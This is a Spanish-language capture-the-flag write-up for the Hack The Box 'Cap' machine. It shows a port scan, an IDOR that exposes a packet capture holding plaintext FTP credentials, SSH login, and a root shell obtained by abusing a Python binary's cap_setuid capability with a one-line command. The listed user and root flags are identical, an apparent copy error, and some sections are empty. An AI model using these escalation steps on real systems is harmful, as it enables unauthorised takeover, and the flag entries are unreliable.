---
title: Hack the box - Cap
date: 2026-09-03
platform: Hack the box
difficulty: Easy
os: Linux
tags:
  - IDOR
  - LinuxCapabilities
  - Python
status: Completada
---

# Resumen Ejecutivo
**IP Objetivo:** `10.129.234.54`
**Descripción breve:**  

---

## 1. Information Gathering (Reconocimiento)

### Escaneo de Puertos con [[Nmap]]
```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.129.234.54 -n -Pn -oG escaneo
```

**Puertos Abiertos:**
- 21 ([[FTP - SFTP|FTP]]), 22 ([[SSH]]), 80 (HTTP)

### Enumeración de Servicios / Fuzzing
```bash

```

**Descubrimientos clave:**
- un link que nos lleva a informacion de usuarios que podemos prestarle atencion

---

## 2. Vulnerability Assessment (Análisis de Vulnerabilidades)
- [[IDOR]]
- No hubo cifrado de datos ya que las credenciales pasaron en texto claro por el protocolo [[FTP - SFTP|FTP]].

---

## 3. Exploitation (Acceso Inicial)
### Metodología
1. Cambiar el Id de la url de la pagina de usuario ([[IDOR]]).
2. Descargar el archivo `.pcap`.
3. Revisar el archivo `.pcap` en Wireshark/tshark para capturar credenciales de [[FTP - SFTP|FTP]].
4. Conectarse a través de [[SSH]] con el usuario `nathan`.

### Ejecución
```bash
ssh nathan@10.129.234.54
```

**Prueba de acceso (User Flag):**
```bash
004c6a1749bf2ced25e054a52f73807a
```

---

## 4. Privilege Escalation (Escalada de Privilegios)

### Enumeración Interna
- [[Escaladas de privilegios#Linux Capabilities|Linux Capabilities Python]]
- usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

### Explotación Local
1. usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

### Ejecución
```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Prueba de acceso (Root/SYSTEM Flag):**
```bash
004c6a1749bf2ced25e054a52f73807a
```